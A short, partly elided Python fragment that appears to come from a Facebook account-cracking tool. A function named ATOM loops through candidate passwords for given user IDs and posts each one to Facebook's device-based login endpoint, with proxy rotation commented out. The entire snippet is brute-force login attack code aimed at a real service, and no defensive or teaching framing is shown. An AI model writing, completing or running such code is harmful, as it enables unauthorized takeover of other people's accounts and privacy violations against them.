...
def ATOM(uid, pww, total_idz):
    ...
    try:
        for pw in pww:
            ...
            response = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=headers,allow_redirects=False) #proxies=proxs)
            #print(response)
